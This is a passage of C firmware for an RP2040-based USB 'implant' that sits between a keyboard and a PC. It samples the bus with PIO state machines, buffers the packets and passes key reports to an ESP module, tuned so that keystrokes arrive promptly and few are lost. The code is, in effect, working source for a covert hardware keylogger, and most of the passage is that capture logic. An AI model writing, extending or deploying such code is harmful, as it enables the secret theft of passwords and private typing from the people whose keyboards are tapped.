    adc_gpio_init(RP_ADC_GPIO);
    adc_select_input(1); // ADC1 is GPIO27
    // 12-bit conversion, assume max value == ADC_VREF == 3.3 V
    const float conversion_factor = 3.3f / (1 << 12);
    uint16_t result = adc_read();
    printf("Raw value: 0x%03x, voltage: %f V\n", result, result * conversion_factor);
}

int main(void)
{
    watchdog_disable();

    boot_press();
    ota_boot_check();
    clock_mode_boot_check();
    boot_watchdog = watchdog_caused_reboot();

    /*
      120 MHz gives the PIO integer dividers at both speeds: 8 for the 15 MHz of low speed and 1
      for the 120 MHz of full speed (usb_speed_set()). At the default 125 MHz they would be 8.333
      and 1.042, and a fractional divider moves the sample point by up to one 8 ns system clock:
      1.2% of a low speed bit, about a tenth of a full speed one (computed; no capture has run at
      125 MHz).
    */
    boot_clock_ok = set_sys_clock_khz(120000, true);

    boot_spi_baud = spi_set_baudrate(SPI_ID, SPI_BAUD);

    // The capture starts before the rest of the board, which core 1 brings up meanwhile: a keyboard
    // powered up with the implant gets its first SETUP about 190 ms after it attaches and the last
    // about 370 ms after (a Windows 11 PC, after a re-enumeration, 2026-11-04), and its descriptors
    // are what usb_hid.h needs to read anything but the boot layout.
    pio_destroy();

    // START is an output held low, D+ and D- are inputs.
    gpio_init(START_INDEX);
    gpio_set_dir(START_INDEX, GPIO_OUT);
    gpio_put(START_INDEX, false);
    gpio_init(DP_INDEX);
    gpio_set_dir(DP_INDEX, GPIO_IN);
    gpio_init(DM_INDEX);
    gpio_set_dir(DM_INDEX, GPIO_IN);

    // The USB switch connects the capture inputs to the bus now that they are inputs, and
    // rp_board_boot_init() leaves it alone when core 1 runs it.
    rp_switch_on_early = true;
    gpio_init(USSEL_PIN);
    gpio_set_dir(USSEL_PIN, GPIO_OUT);
    gpio_put(USSEL_PIN, true);
    gpio_init(USOE_PIN);
    gpio_set_dir(USOE_PIN, GPIO_OUT);
    gpio_put(USOE_PIN, false);

    // Low speed and full speed, a trimmed-down version of Alex Taradov's design. At low speed
    // PIO0 and PIO1 run at 15 MHz: a PIO cycle is 66.67 ns and a low speed bit 666.67 ns, so
    // 10 PIO cycles per captured bit, which the cycle-counted sampling loops in okhi.pio rely
    // on. At full speed (12 Mbit/s) they run at 120 MHz, the same 10 cycles per bit. The state
    // machines are set up here for low speed; usb_speed_set() applies the speed of whatever is
    // attached.

    float target_frequency_hz = 15000000.0f;
    float sys_clk_hz = (float)clock_get_hz(clk_sys);
    float div = sys_clk_hz / target_frequency_hz;

    // Both PIO programs load at the same offsets on every run (pio_destroy() cleared both
    // instruction memories), so instruction addresses such as the entry point at 31 are known.

    // PIO1: the SE0 START synchroniser (tar_pio1).
    pio_gpio_init(pio1, START_INDEX);                     // hand the START pin to PIO
    pio_set_irq0_source_mask_enabled(pio1, 0x0F00, true); // enable PIO IRQ sources (debug)
    irq_set_exclusive_handler(PIO1_IRQ_0, pio1_irq);
    irq_set_enabled(PIO1_IRQ_0, true);
    int pio1_sm = pio_claim_unused_sm(pio1, true);
    uint offset_pio1 = pio_add_program(pio1, &tar_pio1_program);
    pio_sm_set_consecutive_pindirs(pio1, pio1_sm, START_INDEX, 1, true); // START = output
    pio_sm_set_consecutive_pindirs(pio1, pio1_sm, DP_INDEX, 2, false);   // D+, D- = inputs
    pio_sm_config c_pio1 = tar_pio1_program_get_default_config(offset_pio1);
    sm_config_set_set_pins(&c_pio1, START_INDEX, 1); // SET target = START
    sm_config_set_in_shift(&c_pio1, false, false, 0);
    sm_config_set_out_shift(&c_pio1, false, false, 0);
    sm_config_set_in_pins(&c_pio1, DP_INDEX); // IN base = D+ (so D-, START follow)
    sm_config_set_clkdiv(&c_pio1, div);       // same 15 MHz as PIO0
    pio_sm_init(pio1, pio1_sm, offset_pio1, &c_pio1);
    pio_sm_set_enabled(pio1, pio1_sm, false); // stopped until usb_speed_start()
    pio_sm_clear_fifos(pio1, pio1_sm);
    pio_sm_restart(pio1, pio1_sm);
    pio_sm_clkdiv_restart(pio1, pio1_sm);

    // PIO0: the bit sampler (tar_lowsp_pio0).
    pio_set_irq0_source_mask_enabled(pio0, 0x0F00, true);
    irq_set_exclusive_handler(PIO0_IRQ_0, pio0_irq);
    irq_set_enabled(PIO0_IRQ_0, true);
    int pio0_sm = pio_claim_unused_sm(pio0, true);
    uint offset_pio0 = pio_add_program(pio0, &tar_lowsp_pio0_program);
    pio_sm_set_consecutive_pindirs(pio0, pio0_sm, DP_INDEX, 3, false); // D+, D-, START = inputs
    pio_sm_config c_pio0 = tar_lowsp_pio0_program_get_default_config(offset_pio0);
    sm_config_set_in_pins(&c_pio0, DP_INDEX);           // IN base = D+ (PIN0=D+, PIN1=D-, PIN2=START)
    sm_config_set_jmp_pin(&c_pio0, DP_INDEX);           // JMP pin D+ (D- at full speed, usb_speed_set())
    sm_config_set_in_shift(&c_pio0, false, true, 31);   // ISR: shift left, autopush every 31 bits
    sm_config_set_out_shift(&c_pio0, false, false, 32); // OSR: shift left, no autopull (used for the ::PINS trick)
    sm_config_set_fifo_join(&c_pio0, PIO_FIFO_JOIN_RX); // give all FIFO depth to RX (capture only)
    sm_config_set_clkdiv(&c_pio0, div);                 // 15 MHz
    pio_sm_init(pio0, pio0_sm, offset_pio0, &c_pio0);
    pio_sm_set_enabled(pio0, pio0_sm, false); // stopped until usb_speed_start()
    pio_sm_clear_fifos(pio0, pio0_sm);
    pio_sm_restart(pio0, pio0_sm);
    pio_sm_clkdiv_restart(pio0, pio0_sm);

    usb_speed_init(pio0_sm, offset_pio0, pio1_sm, offset_pio1);

    // 'index'  = next free slot for an incoming DATA word.
    // 'packet' = start slot (header) of the packet currently being received.
    int index = 0;
    int packet = 0;
    bool dropping = false;
    bool overrun = false;
    bool report_waiting = false;
    uint32_t report_at = 0;
    const int words = sizeof(dbuff1.g_buffer) / sizeof(dbuff1.g_buffer[0]);

    // Initialise the double buffer and start capturing into dbuff1.
    last_dbuff = NULL;
    curr_dbuff = NULL;
    memset((void *)&dbuff1, 0, sizeof(dbuff1));
    memset((void *)&dbuff2, 0, sizeof(dbuff2));
    reinit_dbuff(&dbuff1);
    reinit_dbuff(&dbuff2);
    curr_dbuff = &dbuff1;

    // Start at slot 2: slots 0 and 1 are reserved for the first packet's SIZE and
    // TIME header words (data words land at 'index', header is written at 'packet').
    index = 2;
    packet = 0;
    curr_dbuff->g_buffer_info.count = 0;

    set_error(false);

    // Launch the core 1 decode worker (reset first, for a clean start). Its launch handshake runs
    // through the inter-core FIFO, so it comes before core 0 hands over any buffer there.
    multicore_reset_core1();
    multicore_launch_core1(core1_main);

    // If the capture loop ever stalls for >4 s, reboot.
    watchdog_enable(4000, 0);

    // Start capture at the speed the lines idle at (low speed with nothing attached yet).
    // usb_speed_start() parks PIO0 at its entry point (index 31, the "wait for START"
    // instruction) and flushes its FIFO, then enables PIO1: it debounces a clean SE0 and raises
    // START, releasing PIO0 to begin sampling from a known bus state.
    usb_fs_filter_t fs_filter = {.tok = -1};

    usb_speed_set(usb_speed_at_boot());
    reinit_dbuff(curr_dbuff);
    usb_speed_start();
    capture_started_ms = to_ms_since_boot(get_absolute_time());

    // Core 0's capture loop: drain PIO0's RX FIFO forever. Each word is either a DATA word
    // (bit 31 = 0, packed line samples) or a SIZE word (bit 31 = 1, the packet's bit count).
    // DATA words accumulate at 'index'; a SIZE word closes the current packet.
    while (1)
    {
        if (pio_sm_is_rx_fifo_empty(pio0, pio0_sm))
        {
            capture_note_idle();

            // A report waits while the bus went quiet (a suspend, an unplug): hand it over all the
            // same, between two packets, or it waits for the next traffic. Without this, in a model
            // of the capture path, a key pressed before a 3 s suspend reached the ESP 3 s late.
            if (report_waiting && !overrun && !dropping && index == packet + 2 &&
                time_us_32() - report_at >= CAPTURE_HANDOFF_US && capture_swap())
            {
                report_waiting = false;
                index = 2;
                packet = 0;
                fs_filter.tok = -1;
            }

            // The device on the capture port changed speed: drop the packet being received, hand
            // the buffer over at its last whole packet and capture at the new speed into a fresh
            // one. The PIO is stopped meanwhile, so waiting here for core 1 to release a buffer
            // loses no FIFO word, only the bus traffic of the wait. The lines tell 2 ms after a
            // plug-in, while the PC still waits out its 100 ms debounce (usb_speed.h).
            if (usb_speed_switch_due())
            {
                usb_speed_stop();
                index = packet + 2;

                // A buffer with no packet long enough to be a report and no reset marker holds
                // nothing core 1 needs (SOFs, keep-alives, polls): it is dropped, not waited for.
                // A resume switches twice in about 25 ms (the PC drives K, the other speed's idle
                // level, for 20 ms). Core 1 takes up to 45 ms to decode and forward a full buffer
                // of 3984 SOFs (measured on the bench as the delay it adds to an ESP poll), and
                // waiting for it at the second switch would keep the PIO stopped into the polls
                // after it.
                if (report_waiting || curr_dbuff->g_buffer_info.markers)
                {
                    while (curr_dbuff->g_buffer_info.count && !capture_swap())
                    {
                        capture_note_idle();
                    }
                }

                usb_speed_set(!capture_fs);
                reinit_dbuff(curr_dbuff);
                index = 2;
                packet = 0;
                dropping = false;
                overrun = false;
                report_waiting = false;
                fs_filter.tok = -1;
                usb_speed_start();
            }

            continue;
        }

        capture_note_traffic();

        uint32_t v = pio_sm_get(pio0, pio0_sm);

        if (v & 0x80000000)
        {
            uint32_t samples = 0xffffffff - v;

            // SIZE word of a packet whose samples did not fit: forget it and reuse its slots,
            // so the buffer stays aligned on packet boundaries.
            if (dropping)
            {
                dropping = false;
                index = packet + 2;
                fs_filter.tok = -1;
                continue;
            }

            // Core 1 is a whole buffer behind: keep draining the PIO, count what is lost, and swap
            // at the first packet boundary after it releases the other buffer.
            if (overrun)
            {
                capture_overruns++;
                fs_filter.tok = -1;

                if (capture_swap())
                {
                    overrun = false;
                    report_waiting = false;
                    index = 2;
                    packet = 0;
                    curr_dbuff->g_buffer_info.after_overrun = true;
                }

                continue;
            }

            // A record whose word count does not fit its sample count gained or lost a FIFO word
            // (the PIO loses one only on a full FIFO, not seen since core 0 stopped waiting for
            // core 1): stored, it would cost core 1 the rest of the buffer at a "Synchronization
            // error". A packet of N samples comes in N / 31 + 1 words, a reset marker in none. Its
            // place keeps a 2-sample record that core 1 decodes as a packet with an error, so a
            // DATA after a lost IN never pairs with the token before it, a host token to another
            // device that a hub repeated to this port. In a model of the capture path, dropping
            // the record alone sent 16 of 16 such reports to that device's address, at both speeds.
            uint32_t stored = (uint32_t)(index - (packet + 2));

            if (stored != (samples ? samples / 31u + 1u : 0u))
            {
                capture_desyncs++;
                curr_dbuff->g_buffer[packet + 2] = 0;
                index = packet + 3;
                samples = 2;
                fs_filter.tok = -1;
            }
            // Full speed: store only what can carry a key, so while the keyboard NAKs its idle polls
            // a buffer lasts about 4 s, as at low speed, at any polling rate and beside the 36000
            // polls a second of another device on the hub (usb_speed.h).
            else if (capture_fs && usb_fs_skip(&fs_filter, curr_dbuff, &packet, &index, samples))
            {
                continue;
            }

            if (!report_waiting && samples >= CAPTURE_REPORT_BITS)
            {
                report_waiting = true;
                report_at = time_us_32();
            }

            // SIZE word: end of a packet. Store the bit count (0xFFFFFFFF - v) in this
            // packet's header and open the next packet.
            curr_dbuff->g_buffer[packet + 0] = samples;
            curr_dbuff->g_buffer[packet + 1] = 0; // TIMER slot (hardware timer not wired up in this build)
            curr_dbuff->g_buffer_info.count++;
            curr_dbuff->g_buffer_info.markers += samples == 0;
            packet = index; // next packet's header starts where data will follow
            index += 2;     // reserve its SIZE + TIME header slots

            // Buffer full (packet limit reached, or less room left than the largest possible
            // packet): hand it to core 1 and swap, always between two packets. Heavy traffic
            // fills the words before the 5000 packets; a handoff mid-packet splits a packet
            // across both buffers and puts the next one out of step, which then loses every
            // report it holds.
            if (curr_dbuff->g_buffer_info.count == curr_dbuff->g_buffer_info.limit ||
                index > words - CAPTURE_RESERVE_WORDS)
            {
                fs_filter.tok = -1;

                if (capture_swap())
                {
                    report_waiting = false;
                    index = 2;
                    packet = 0;
                }
                else
                {
                    overrun = true;
                }
            }
            // A report waits in a buffer that is not full: hand it over early if core 1 has
            // released the other buffer, otherwise keep filling.
            else if (report_waiting && time_us_32() - report_at >= CAPTURE_HANDOFF_US && capture_swap())
            {
                report_waiting = false;
                index = 2;
                packet = 0;
                fs_filter.tok = -1;
            }
        }
        else if (!overrun && !dropping && index < words - 4 && index - packet < CAPTURE_RESERVE_WORDS)
        {
            // DATA word: append the packed samples. A record longer than CAPTURE_RESERVE_WORDS, or
            // one with no room left, is dropped whole instead of split: no key comes in one (each
            // packet of a full speed report is 23 words at most, 21 DATA words plus its 2 header
            // words), only line noise, isochronous data and the K of a resume read at the old
            // speed until core 0 switches, 2 ms of it (774 words).
            curr_dbuff->g_buffer[index++] = v;
        }
        else if (!overrun)
        {
            dropping = true;
        }
    }

    return 0;
}
